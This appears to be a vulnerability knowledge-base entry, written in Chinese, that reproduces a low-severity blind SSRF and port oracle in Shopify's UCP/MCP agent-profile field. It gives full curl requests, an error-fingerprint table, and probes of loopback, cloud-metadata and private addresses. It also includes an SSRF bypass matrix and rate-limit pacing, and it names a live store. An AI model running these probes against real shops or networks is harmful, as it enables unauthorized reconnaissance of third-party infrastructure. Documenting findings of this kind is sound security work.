# Shopify UCP/MCP /api/ucp/mcp：agent profile 盲 SSRF（server-side request validation）

> 本条目是 KB#541（UCP/MCP profile 盲 SSRF/端口 oracle 基础条目）的实测补充与完整复现；同端点的 profile 自绕未认证写 Cart/Checkout 见 KB#518/#578/#528，get_order 认证边界见 KB#594。

## 结论

- `POST https://<shop>/api/ucp/mcp`（JSON-RPC 2.0）在 `tools/call` 的 `params.arguments.meta.ucp-agent.profile` 里接受任意 `https://` URL，由服务端主动发起抓取。
- 抓取结果按固定错误分类回显，构成盲 SSRF：可用于判定「公网可达主机 + 端口是否开放」「响应是否为 JSON / HTTP 层是否报错」。
- 能力上限：只收 https；不回显响应体；不跟随 301/302 → 读不到内网内容。loopback / RFC1918 / 169.254.169.254 只得到 Network error 或超时，与端口关闭不可区分。severity low（agent profile 是功能设计，不是可越权的 SSRF）。

## 前置

- 目标为 Shopify 托管店，且 `GET https://<shop>/.well-known/ucp` 返回 200 JSON（响应头 `powered-by: Shopify`）。
- 零凭据：不需要 Cookie / JWT / 账号。
- 请求头必须同时带：
  - `Content-Type: application/json`
  - `Accept: application/json, text/event-stream`
- 单线程、请求间隔 ≥2.5s：该端点约 25 次请求触发 429（冷却约 880s）。

## 1) 端点探活（initialize）

```bash
curl -sk -X POST 'https://<shop>/api/ucp/mcp' \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json, text/event-stream' \
  --data '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"t","version":"1"}}}'
```

期望 `HTTP 200`，`result.serverInfo` 存在（实测 `name` 形如 `universal-…`、`version` `0.1.0`）。

## 2) success 基线（证明抓取由 profile 驱动且能解析）

```bash
curl -sk -X POST 'https://<shop>/api/ucp/mcp' \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json, text/event-stream' \
  --data '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"search_catalog","arguments":{"meta":{"ucp-agent":{"profile":"https://<shop>/.well-known/ucp"}},"catalog":{"query":"test"}}}}'
```

期望 `HTTP 200`，`result.content[0].text`（JSON 字符串）内含 `{"ucp":{...,"status":"success"...}}`。这一组是后续所有错误的对照基线。

## 3) 错误分类表（同一请求体只改 profile 值）

| 回显 content | data.code | HTTP | 含义 |
|---|---|---|---|
| `Invalid content type` | `profile_malformed` | 422 | 连通，响应非 JSON |
| `Http error` | `profile_unreachable` | 422 | 连通，HTTP 层错误（4xx/5xx，或 3xx 未跟随） |
| `Network error` | `profile_unreachable` | 422 | 连接快速失败（RST / DNS 失败 / 地址不可用），约 1–3s |
| `Connection timeout` | `profile_unreachable` | 422 | 连接/DROP 型超时，约 10–16s；**端口不通的关键指纹** |
| `Https required` | `invalid_profile_url` | 422 | URL 层拒绝非 https scheme |
| `Invalid uri format` | `invalid_profile_url` | 422 | URL 解析层拒绝（前导空白、反斜杠等） |

实测清单（2026-11-11，retro-refresh.com）：

```text
profile=https://retro-refresh.com/.well-known/ucp        → 200 status:success（重跑一致）
profile=https://retro-refresh.com/robots.txt             → 422 profile_malformed "Invalid content type"
profile=https://retro-refresh.com/i1676-no-such-path-xyz → 422 profile_unreachable "Http error"
profile=https://127.0.0.1/                               → 422 profile_unreachable "Network error" (1.15s)
profile=http://169.254.169.254/                          → 422 invalid_profile_url "Https required" (4.13s)
```

## 4) 端口存活 oracle（必须先做已知答案标定）

对**同一授权主机**的已知开放/关闭端口各测一次，先标定：

```text
profile=https://<同一主机>:8443/  → "Http error"        (0.3–0.5s)   ← 有服务响应
profile=https://<同一主机>:9999/  → "Connection timeout" (约 15s)     ← 无服务
```

实测：`:8443` → `Http error`（0.519s；重跑 0.319s），`:9999` → `Connection timeout`（15.472s）。

标定后对目标 host:port 逐个发 profile，判读：

- `Http error` / `Invalid content type` → **端口开放**
- `Connection timeout` → **端口无服务或被 DROP**
- `Network error`（1–3s）→ 连接快速失败；与「端口关闭但 RST」不可区分
- 时延不可作精细判据（不同 URL 形态下 1.1s / 6.3s 有波动）

## 5) 不跟随 302（开放重定向不能降级为 http/内网探测）

门店自身有一个已确认会 302 到 `return_to` 的端点，把它作为 profile：

```text
profile=https://<shop>/services/login_with_shop/buyer/complete?return_to=https%3A%2F%2F<shop>%2F.well-known%2Fucp
→ 422 profile_unreachable "Http error"（未 success）
```

即：抓取客户端不跟随 301/302 → 不能用门店开放重定向把 https 跳转成 http/内网目标。

## 6) 绕过矩阵（该客户端，全部阴性）

- `https://<shop>@127.0.0.1/`（userinfo）→ `Network error`：按 `@` 后主机解析，不是前缀校验
- `HTTPS://127.0.0.1/`（大写 scheme）→ `Network error`：scheme 大小写接受但仍连回环
- `https://127.0.0.1\@<shop>/`、`" https://127.0.0.1/"` → `Invalid uri format`（解析层拒绝）
- `https://127.0.0.1.nip.io/`（DNS 重绑定）→ `Network error`：与直连 127.0.0.1 同形，未见绕过
- `https://[::1]/` → `Network error`
- 302 降级 → 见第 5 节，`Http error`

## 7) 内网单点（不扫段、无内容回显）

```text
profile=https://169.254.169.254/ → "Network error"
profile=https://10.0.0.1/        → "Connection timeout" (10.08s)
profile=https://192.168.0.1/     → "Connection timeout" (12.90s)
```

只能说明这些地址不可达/被丢包，**不具备内网端口发现能力**。

## 判据汇总（缺一不可）

1. 同一请求体只改 `profile`，`success` 基线成立 → 抓取由我方 URL 驱动且能解析。
2. 同一授权主机已知开放端口 → `Http error`、关闭端口 → `Connection timeout`，分类稳定可重复 → 差异不是随机失败。
3. 任意错误的 `data.code` 与 `content` 与上表一致；请求间隔 ≥2.5s 未触发 429。

## 失败常见原因

- 缺 `Accept: application/json, text/event-stream` → 不进抓取分支。
- profile 不是合法 https URL → 直接 `invalid_profile_url`。
- 高频请求触发 429 → 降速重试。
- 目标非 Shopify 托管店或未开 UCP → `/.well-known/ucp` 404。

## 证据

2026-11-11 UTC 本机 bash + curl 8.5.0（经平台记录代理，无 Cookie/Authorization，单线程 3s 间隔，共 20 次请求未触发 429；原始请求/响应落盘 `/opt/artex/data/tasks/9/i1676/resp/`，p01–p19 + init）。finding_id=128。